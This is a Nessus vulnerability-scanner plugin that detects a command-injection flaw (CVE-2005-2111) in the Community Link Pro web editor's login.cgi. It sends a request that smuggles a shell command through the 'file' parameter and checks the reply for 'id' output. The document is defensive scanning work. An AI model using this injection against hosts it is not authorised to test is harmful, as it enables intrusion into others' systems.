#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
 script_id(19305);
 script_version("$Revision: 1.12 $");
 script_cvs_date("$Date: 2016/10/07 13:30:47 $");

 script_cve_id("CVE-2005-2111");
 script_bugtraq_id(14097);
 script_osvdb_id(17672);

 script_name(english:"Community Link Pro login.cgi file Parameter Arbitrary Command Execution");
 script_summary(english:"Checks for Community Link Pro webeditor login.cgi remote execution flaw");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a CGI script that allows arbitrary
command execution.");
 script_set_attribute(attribute:"description", value:
"The remote host is running Community Link Pro, a web-based
application written in Perl. 

The remote version of this software fails to sanitize user input to
the 'file' parameter of the 'login.cgi' script of shell metacharacters
before using it to run a command.  An unauthenticated attacker can
leverage this issue to execute arbitrary commands on the remote host
subject to the privileges under which the web server operates.");
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2005/Jun/265");
 script_set_attribute(attribute:"solution", value:
"There is no known solution at this time.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value:"2005/07/27");
 script_set_attribute(attribute:"vuln_publication_date", value:"2005/06/29");

 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2005-2016 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");

 script_dependencie("http_version.nasl");
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_ports("Services/www", 80);

 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");
port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

http_check_remote_code (
                        check_request:"/login.cgi?username=&command=simple&do=edit&password=&file=|id|",
                        check_result:"uid=[0-9]+.*gid=[0-9]+.*",
                        command:"id",
			extra_dirs:make_list("/app/webeditor")
                        );

